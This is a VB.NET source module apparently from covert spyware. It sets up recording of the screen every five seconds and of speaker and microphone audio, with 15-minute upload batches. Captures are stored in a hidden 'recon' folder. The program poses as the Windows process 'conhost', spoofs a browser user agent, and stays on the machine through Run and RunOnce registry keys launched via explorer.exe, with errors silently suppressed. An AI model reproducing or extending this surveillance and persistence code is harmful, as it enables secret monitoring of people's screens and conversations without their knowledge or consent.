#Region "References"

Imports System.IO
Imports Microsoft.Win32

#End Region

Friend Module Common

    Friend ComputerId As String

    Friend IsAppExit As Boolean

    Friend MonitorEnabled As Boolean = True
    Friend ScreenRecorderEnabled As Boolean = True
    Friend SpeakersRecorderEnabled As Boolean = True
    Friend MicRecorderEnabled As Boolean = True

    Friend Const SCREENSHOT_INTERVAL As Integer = 5000 'Numbers of milliseconds between each screenshot (5 seconds)
    Friend Const SCREENSHOTS_TO_UPLOAD As Integer = 180 'Number Of screenshots to trigger the upload process (15 minutes recording)
    Friend Const SCREENSHOTS_TO_SAVE As Integer = 3 'Number Of screenshots to cause the app to save them to disk

    Friend Const AUDIO_RECORD_DURATION As Integer = 900000 'Audio recording duration to trigger the upload process (15 minutes recording)

    Friend ReadOnly DirRoot As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "recon") 'Root app directory path
    Friend ReadOnly DirScreenshots As String = Path.Combine(DirRoot, "screenshots") 'Path to save the recorded screenshots
    Friend ReadOnly DirAudioOutput As String = Path.Combine(DirRoot, "audio-output") 'Path to save the audio output
    Friend ReadOnly DirAudioInput As String = Path.Combine(DirRoot, "audio-input") 'Path to save the audio input

    Friend Const APP_FILE_NAME As String = "conhost" 'App fake name
    Friend Const ZIP_FILE_PASS As String = "TEST1234" 'The zip file password
    Friend Const USER_AGENT As String = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"

    Friend Sub EnableAutoStart()

        Dim appLauncherPath = String.Concat(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "explorer.exe"), " ", """", Process.GetCurrentProcess.MainModule.FileName, """")

        Try
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", APP_FILE_NAME, appLauncherPath, RegistryValueKind.String)
        Catch ex As Exception
            'Do nothing
        End Try

        Try
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", APP_FILE_NAME, appLauncherPath, RegistryValueKind.String)
        Catch ex As Exception
            'Do nothing
        End Try

    End Sub

End Module